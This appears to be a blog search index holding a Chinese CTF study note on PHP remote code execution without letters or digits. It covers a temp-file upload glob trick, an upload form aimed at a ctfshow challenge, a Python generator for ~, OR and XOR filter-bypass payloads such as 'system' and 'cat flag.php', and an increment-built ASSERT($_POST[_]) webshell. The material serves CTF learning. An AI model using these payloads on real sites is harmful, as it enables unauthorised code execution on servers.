[{"title":"java learn","url":"/2025/08/20/java-learn/","content":""},{"title":"无字符数字RCE","url":"/2025/08/20/%E6%97%A0%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97RCE/","content":"无字母数字rce1.临时文件上传 原理：无字母数字要实现远程指令操作，也就是要想办法绕过网站过滤的指令，而通过post上传文件（和文件夹tmp联系一起，把指令直接在网站内的tmp中执行绕过了过滤的环节）此时php会在Linux里的临时文件夹保存文件，且文件一定是php加上6个随机的字符，6个随机字符会出现大写的情况，文件的位置是&#x2F;tmp&#x2F;php??????。根据6个字符会出现大写的情况，我们在编辑访问的时候要确保我们提交的东西被执行也就是匹配问题。无字母数字的条件下我们一般会使用glob通配符”？”去解决也就是**. &#x2F;???&#x2F;?????????(. &#x2F;tmp&#x2F;php??????)【这条指令的含义是php运行这个文件所在位置包含的东西（. &#x2F;表示执行**）】但是后面的9个“？”能够匹配的文件太多了，也就会导致无法执行到我们提交的文件。所以要根据上传文件后六个字符随机出现大写的特性去匹配，\n而glob支持使用类似[0-9]的形式去表达范围，那么类似我们可以查询ASCII码表\n\n可以发现表达所有大写字母可以用[@-[]去表示所以原来的指令写成. &#x2F;???&#x2F;????????[@-[]（表示最后一位字符是大写字母的情况），因为生成的后六位字符大写情况是随机的所以可能需要多次提交去匹配。\n实现临时文件上传构建html页面有关html的知识点1.构建网页的基本结构&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt; &lt;!--对于中文网页需要使用此条声明编码有些浏览器会设置GBK为默认编码--&gt;&lt;title&gt; &lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;/body&gt;&lt;/html&gt;\n\n2.一些常见的标签以及标签知识HTML标题\n&lt;h1&gt; 这是一段标题&lt;/h1&gt;&lt;h2&gt;           &lt;/h2&gt;\n\n\n\nHTML段落\n&lt;p&gt;这是一个段落 &lt;/p&gt;\nHTML链接\n&lt;a href=&quot;链接&quot;&gt;这是一个链接&lt;/a&gt;\nHTML图像\n&lt;img src=&quot;/images/logo.png&quot; width=&quot;258&quot; height=&quot;39&quot; /&gt;\n3.关于标签与元素\nHTML元素以开始标签起始 以结束标签终止。例子：  元素的内容在开始与结束标签之间\n2.构建文件上传网页&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;https://648cc2ce-53dc-47cb-b1b0-8fcdcbf1e724.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n下面代码是对网页做了一个大小的动态调整使得这个网页能够在任何设备上正常显示\n&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\n\nform标签是创建表单，用于用户输入\naction属性是**标签的一个重要组成部分，它定义了当表单提交时，表单数据应该发送到哪里。这个属性的值可以是一个文件名，处理表单数据的脚本，或者是一个服务器的URL。\nenctype属性‌用于规定表单数据在发送到服务器之前如何进行编码。它主要有三个取值：\n1.application&#x2F;x-www-form-urlencoded：这是默认的编码方式，表单数据被编码为名称&#x2F;值对（即键值对），适用于大多数常规的表单提交。在这种编码方式下，所有字符都会进行编码，空格被编码为“+”号，特殊字符被编码为ASCII十六进制值‌12。\n2.‌multipart&#x2F;form-data‌：这种编码类型用于文件上传。表单数据被编码为一条消息，每个控件对应消息中的一个部分。这种编码方式不对字符进行编码，适用于包含文件上传控件的表单。使用这种编码方式时，必须配合POST方法提交表单‌12。\n3.‌text&#x2F;plain：表单数据以纯文本形式进行编码，不含任何控件或格式字符。这种编码方式较少使用‌\nlabel属性是一个标签为为 input 元素定义标注（标记）”for” 属性可把 label 绑定到另外一个元素。把 “for” 属性的值设置为相关元素的 id 属性的值。\ninput的功能取决于type，type&#x3D;file定义文件选择字段和 “浏览…” 按钮，供文件上传。\ntype&#x3D;submit定义提交按钮。\n3.burp截取上传请求并修改添加指令先ls查询当前目录文件 下图是ctfshow web56时添加的指令作为参考\n\n没有出现结果多发送几次原理上面有解释。\n思路：以下三种都是直接通过将原来指令一个字母一个字母用字符替换（通过运算公式去实现）的形式\n2.取反原理：每一个字母用“~“取反后得到的url编码再次取反还是它本身\n&lt;?php    $a=urlencode(~&#x27;php&#x27;)    echo $a;    echo &#x27;&lt;/br&gt;&#x27;;    $b=urlencode($a);    echo $b;    \n\n\n\n利用得到的url编码加上取反符号”~”可以绕过一些数字字母过滤\n3.异或这里先了解或运算”||“（”|“）和异或运算”^“\n或运算： 参加运算的两个对象，按二进制位进行“或”运算。\n运算规则：0|0&#x3D;0； 0|1&#x3D;1； 1|0&#x3D;1； 1|1&#x3D;1；即 ：参加运算的两个对象只要有一个为1，其值为1例如: 3|5 可写算式如下： 0000 0011 | 0000 0101 &#x3D; 0000 0111(十进制为7)因此，3|5的值为7。\n这里十进制算出来的可以是ASCII码值所以可以对字符进行运算\n异或运算：参加运算的两个数据，按二进制位进行“异或”运算。\n运算规则：0^0&#x3D;0； 0^1&#x3D;1； 1^0&#x3D;1； 1^1&#x3D;0；即：参加运算的两个对象，如果两个相应位为“异”（值不同），则该位结果为1，否则为0例如：9^5可写成算式如下： 00001001 ^ 00000101 &#x3D; 00001100 (十进制为12)因此，9^5的值为12。\n这里可以参考web42（url编码就是%加上对应字符ASCII码的16进制数）\nimport reimport urllibfrom urllib import parsehex_i = &quot;&quot;hex_j = &quot;&quot;pattern=&#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;  #被过滤的字符str1=[&quot;system&quot;,&quot;cat flag.php&quot;] #需要输出的字母指令for p in range(2):    t1 = &quot;&quot;    t2 = &quot;&quot;    for k in str1[p]:        for i in range(256):#ASCII码表一共256个            for j in range(256):                if re.search(pattern,chr(i)) :#如果有过滤字符跳过一次第一次循环                    break                if re.search(pattern,chr(j)) :#如果有过滤字符跳过一次第二次循环                    continue                if i &lt; 16:                    hex_i = &quot;0&quot; + hex(i)[2:]#hex（）将整数转化为16进制数但是会有0x前缀所以从[2:]开始                else:                    hex_i=hex(i)[2:]                if j &lt; 16:                    hex_j=&quot;0&quot;+hex(j)[2:]                else:                    hex_j=hex(j)[2:]#以上代码都是在筛选可用字符对应的16进制码                hex_i=&#x27;%&#x27;+hex_i                hex_j=&#x27;%&#x27;+hex_j                c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))#或运算然后再转为ASCII码表对应的字母 urlib.parse.unquote()为解码url返回它本身的字符串 ord（）是把字符串变成十进制数 chr是把十进制数变成ASCII码对应字符                if(c ==k):                    t1=t1+hex_i                    t2=t2+hex_j                    break            else:                continue            break    print(&quot;(\\&quot;&quot;+t1+&quot;\\&quot;|\\&quot;&quot;+t2+&quot;\\&quot;)&quot;)\n\n这里就是用到了或运算去绕过字母和数字过滤。\n同理我们也可以用异或的运算符号去替换判断条件\n当然异或也可以直接用符号运算去表示字母\nvar_dump(&#x27;#&#x27;^&#x27;|&#x27;); //得到字符 _`var_dump(&#x27;.&#x27;^&#x27;~&#x27;); //得到字符 P    var_dump(&#x27;/&#x27;^&#x27;&#x27;); //得到字符 0    var_dump(&#x27;|&#x27;^&#x27;/&#x27;); //得到字符 S    var_dump(&#x27;&#123;&#x27;^&#x27;/&#x27;); //得到字符 T    $__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);  //变量$__值为字符串&#x27;_POST&#x27;\n\n\n\n\n\n\n\n4.自增$_++&#x3D;1因为在没有给定初值的情况下运行时会认问是false&#x3D;0然后再自增得到1 那么利用自增函数只要‘A’我们就可以用字符拿到所有的字母\n在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array\n这里面就有A\np神的构造\n&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);\n\n但是这个构造太长了局限性很大不是很好用，了解即可。\n"}]